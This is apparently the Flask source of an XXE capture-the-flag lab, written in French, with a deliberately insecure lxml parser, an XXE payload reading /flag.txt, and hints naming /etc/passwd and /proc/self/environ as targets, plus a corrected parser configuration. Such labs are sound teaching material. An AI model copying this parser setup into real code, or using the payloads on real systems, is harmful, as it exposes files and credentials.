# VulnLab C12 — XML External Entity (XXE)
# VULNÉRABILITÉ : lxml parsé avec resolve_entities=True (défaut)
from flask import Flask, request, render_template_string
from lxml import etree

app = Flask(__name__)

EXAMPLE_XML = """<?xml version="1.0" encoding="UTF-8"?>
<invoice>
  <id>INV-2024-001</id>
  <client>Alice Dupont</client>
  <amount>1299.99</amount>
  <description>Laptop Pro X</description>
</invoice>"""

XXE_EXAMPLE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<invoice>
  <id>INV-HACK</id>
  <client>&xxe;</client>
  <amount>0</amount>
</invoice>"""

PAGE = '''<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>InvoiceParser</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',sans-serif;background:#f5f6f8;min-height:100vh;padding:40px 24px}
.wrap{max-width:900px;margin:0 auto}h1{font-size:22px;color:#1a2744;margin-bottom:6px}
.sub{font-size:13px;color:#8a94a6;margin-bottom:28px;font-family:monospace}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}@media(max-width:700px){.grid{grid-template-columns:1fr}}
.card{background:#fff;border:1px solid #e2e8f0;border-radius:10px;padding:22px;box-shadow:0 1px 6px rgba(0,0,0,.06)}
.card h3{font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:#8a94a6;margin-bottom:14px}
textarea{width:100%;padding:10px 13px;border:1.5px solid #e2e8f0;border-radius:8px;font-size:12px;font-family:monospace;color:#1a2744;background:#fafafa;resize:vertical;outline:none;min-height:220px}
textarea:focus{border-color:#2d6ef7}
.btn{margin-top:10px;padding:10px 20px;background:#2d6ef7;color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer}
.result-box{background:#1e1e2e;border-radius:8px;padding:14px;font-family:monospace;font-size:12px;color:#cdd6f4;line-height:1.8;white-space:pre-wrap;word-break:break-all;min-height:60px;margin-top:12px}
.kv{display:flex;gap:8px;padding:6px 0;border-bottom:1px solid #f0f2f5;font-size:13px}
.kv:last-child{border:none}.k{font-weight:600;width:110px;color:#1a2744;flex-shrink:0}.v{color:#4a5568;word-break:break-all}
.flag-val{color:#16a34a;font-weight:700;font-family:monospace}
.flag-banner{background:linear-gradient(135deg,#0f2a0f,#1a4a1a);border:1px solid #2d6b2d;border-radius:10px;padding:18px 20px;display:flex;align-items:center;gap:14px;margin-bottom:16px}
.flag-lbl{font-size:10px;color:#6dbf6d;text-transform:uppercase;letter-spacing:.1em;margin-bottom:4px}
.flag-txt{font-family:monospace;font-size:15px;color:#86efac;font-weight:700}
.err{background:#fef2f2;border:1px solid #fecaca;color:#991b1b;border-radius:8px;padding:12px;font-size:13px;margin-top:10px}
.warn{background:#fff8e1;border:1px solid #ffe082;border-radius:8px;padding:10px 14px;font-size:12px;color:#7a5c00;font-family:monospace;margin-bottom:14px}
a.nav{color:#2d6ef7;font-size:13px;text-decoration:none;display:inline-block;margin-top:16px}
.tab-btn{padding:6px 14px;border:1px solid #e2e8f0;border-radius:6px;font-size:12px;font-family:monospace;cursor:pointer;background:#f0f4ff;color:#2d6ef7;margin-right:6px}
</style></head><body><div class="wrap">
<h1>InvoiceParser — Analyse de factures XML</h1>
<p class="sub">Importez vos factures au format XML pour extraction automatique des données</p>

{% if flag_found %}
<div class="flag-banner"><div style="font-size:26px">🚩</div>
<div><div class="flag-lbl">C12 — Flag capturé !</div>
<div class="flag-txt">FLAG{xxe_3xt3rn4l_3nt1ty_r34d}</div></div></div>
{% endif %}

<div class="warn">⚠ Parser XML : lxml avec resolve_entities=True — les entités externes DTD sont résolues</div>

<div class="grid">
<div class="card"><h3>Soumettre un XML</h3>
<button class="tab-btn" onclick="document.getElementById('xml').value=`{{ example_xml | e }}`">Exemple normal</button>
<button class="tab-btn" onclick="document.getElementById('xml').value=`{{ xxe_example | e }}`">Payload XXE</button>
<form method="POST" action="parse">
  <textarea name="xml" id="xml" placeholder="Collez votre XML ici…">{{ submitted_xml or example_xml }}</textarea>
  <button type="submit" class="btn">Parser →</button>
</form>
{% if error %}<div class="err">{{ error }}</div>{% endif %}
</div>

<div class="card"><h3>Résultat du parsing</h3>
{% if fields %}
  {% for k,v in fields.items() %}
  <div class="kv">
    <span class="k">{{ k }}</span>
    <span class="v {% if "FLAG{" in v %}flag-val{% endif %}">{{ v }}</span>
  </div>
  {% endfor %}
{% else %}
  <p style="font-size:13px;color:#8a94a6">Soumettez un XML pour voir le résultat.</p>
{% endif %}
<div class="result-box">{{ raw_xml or "(aucun XML soumis)" }}</div>
</div>
</div>

<a class="nav" href="hints">Hints &amp; Write-up →</a>
</div></body></html>'''

HINTS = '''<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>C12 Hints</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#c8d0dc;padding:40px 24px}.wrap{max-width:720px;margin:0 auto}h1{font-size:22px;color:#e4e8f0;margin-bottom:8px}.sub{font-size:13px;color:#5a6475;font-family:monospace;margin-bottom:28px}.hint{background:#151a22;border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:18px;margin-bottom:12px}.lbl{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px}.l1{color:#16a34a}.l2{color:#d97706}.l3{color:#dc2626}p{font-size:14px;color:#8a94a6;line-height:1.7;margin-bottom:8px}.code{background:#1e1e2e;border-radius:8px;padding:12px;font-family:monospace;font-size:12px;color:#cdd6f4;line-height:1.8;margin:8px 0;white-space:pre;overflow-x:auto}a{color:#4a9eff}</style></head><body>
<div class="wrap"><a href="/" style="font-size:13px;color:#4a9eff;display:block;margin-bottom:20px">← Retour</a>
<h1>C12 — XXE</h1><p class="sub">Python · lxml · Entités externes XML</p>
<div class="hint"><div class="lbl l1">Indice 1 — Payload basique (lire /flag.txt)</div>
<div class="code">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE invoice [
  &lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt;
]&gt;
&lt;invoice&gt;
  &lt;id&gt;HACK&lt;/id&gt;
  &lt;client&gt;&amp;xxe;&lt;/client&gt;
  &lt;amount&gt;0&lt;/amount&gt;
&lt;/invoice&gt;</div></div>
<div class="hint"><div class="lbl l2">Indice 2 — Autres fichiers intéressants</div>
<div class="code">file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ
file:///proc/self/cmdline</div></div>
<div class="hint"><div class="lbl l3">Correction</div>
<div class="code"># ✅ lxml : désactiver les entités externes
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False
)
tree = etree.fromstring(xml_bytes, parser)</div></div>
<p>FLAG : <span style="font-family:monospace;color:#86efac">FLAG{xxe_3xt3rn4l_3nt1ty_r34d}</span></p>
</div></body></html>'''

def parse_xml(xml_str):
    # ⚠️  VULNÉRABILITÉ : parser par défaut résout les entités externes
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
    root   = etree.fromstring(xml_str.encode(), parser)
    fields = {}
    for child in root:
        fields[child.tag] = (child.text or '').strip()
    return fields

@app.route('/', methods=['GET'])
def index():
    return render_template_string(PAGE,
        example_xml=EXAMPLE_XML, xxe_example=XXE_EXAMPLE,
        submitted_xml=None, fields=None, error=None, raw_xml=None, flag_found=False)

@app.route('/parse', methods=['POST'])
def parse():
    xml_str = request.form.get('xml', '').strip()
    fields, error, flag_found = None, None, False
    try:
        fields = parse_xml(xml_str)
        flag_found = any('FLAG{' in str(v) for v in fields.values())
    except Exception as e:
        error = f"Erreur de parsing : {e}"
    return render_template_string(PAGE,
        example_xml=EXAMPLE_XML, xxe_example=XXE_EXAMPLE,
        submitted_xml=xml_str, fields=fields, error=error,
        raw_xml=xml_str[:500], flag_found=flag_found)

@app.route('/hints')
def hints():
    return render_template_string(HINTS)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
